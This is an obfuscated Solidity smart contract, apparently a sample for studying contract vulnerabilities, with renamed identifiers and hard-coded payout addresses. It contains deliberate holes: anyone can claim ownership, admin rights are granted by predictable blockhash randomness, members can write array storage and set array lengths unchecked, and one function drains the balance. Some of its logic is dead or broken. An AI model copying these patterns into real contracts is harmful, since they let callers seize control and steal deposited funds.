pragma solidity ^0.4.23;

contract OX5F4DCC3B {

address public OX7B8B965A = 0x0;
address public OX9A115815;
address public OX8EBF1A8B = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;
address public OX9A5B1E6F = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;
address[] public OX6C8349CC;

mapping(address=>bool) OX8277E091;

uint256 public OX5C6FFBDD;
uint256[] public OX8A8A8F5F = [951828771,158769871220];
uint256[] public OXE99A18C4;

function OX8D9D8C4C() public payable{
	OX9A115815 = msg.sender;
}

modifier OX72B32A1F() {
    require(msg.sender == OX9A115815);
    _;
}

modifier OX6C3E226B() {
    require(msg.sender == OX7B8B965A);
    _;
}

modifier OX807F1A2A() {
    require(OX8277E091[msg.sender]);
    _;
}

function OX4E732CED() public constant returns(uint256) {
	return OX8A8A8F5F.length;
}

function OX5DF60AA4(uint256 OXD9D4F495) public payable OX72B32A1F{
	OX5C6FFBDD = OXD9D4F495;
}

function OX1F0E3DAD() public constant returns(uint256) {
	return OX6C8349CC.length;
}

function OX3B5D5C37() public constant returns(uint256) {
	return address(this).balance;
}

function OX166B40B4() public payable{
	require(msg.value >= 0.02 ether);
	OX6C8349CC.push(msg.sender);
	OX8277E091[msg.sender]=true;
}

function OX9E3669D9() public payable OX807F1A2A{
	require (msg.value >= 0.01 ether);
	if(msg.sender!=OX9A115815 || OX55A8FD60()){
	    uint256 OX6F4922F4 = 0;
        msg.sender.transfer(OX6F4922F4);
	}
}

function OX55A8FD60() private returns(bool){
    bytes32 OX5E6CCAE4 = keccak256(blockhash(block.number-1));
    uint256 OX5C6FFBDD = uint256(OX5E6CCAE4);
        if(OX5C6FFBDD%5==0){
            OX7B8B965A = msg.sender;
            return true;
        }
        else{
            return false;
        }
    }

function OX6F8F5771 () public payable OX807F1A2A {
	require (msg.value >= 0.005 ether);
	 
	OX8EBF1A8B.call.value(msg.value)();
}

function OX70E9A6F3 () public payable OX807F1A2A {
	require (msg.value >= 0.005 ether);
	 
	OX9A5B1E6F.call.value(msg.value)();
}

function OXCE8A1E1C (uint256 OX7C82FB01, uint256 OX12DADA1F) public payable OX807F1A2A {
	OX8A8A8F5F[OX7C82FB01] = OX12DADA1F;
}
	
function OX4E8D8F51 (uint256 OX22E4F10F) public payable OX807F1A2A {
	OX8A8A8F5F.length = OX22E4F10F;
}

function OX6D0D5722 (uint256 OX8A6E7A7A) public payable OX807F1A2A returns(uint256) {
	return (OX8A6E7A7A / (OX8A8A8F5F[0]*OX8A8A8F5F[1]));
	if((OX8A6E7A7A / (OX8A8A8F5F[0]*OX8A8A8F5F[1])) == OX5C6FFBDD) {
		OX9A115815 = OX7B8B965A;
	}
}

function OX994C1E71 () public payable OX807F1A2A returns(bool) {
    require(msg.value >= 0.01 ether);
    if(msg.value == OX5C6FFBDD){
        return true;
    }
}

function OX8BFA8D88() public payable OX72B32A1F {
	 
	OX9A115815.call.value(1 wei)();
}

function OX5A6A26D5() public payable OX6C3E226B {
	OX7B8B965A.transfer(address(this).balance);
}

function() public payable{
	}
}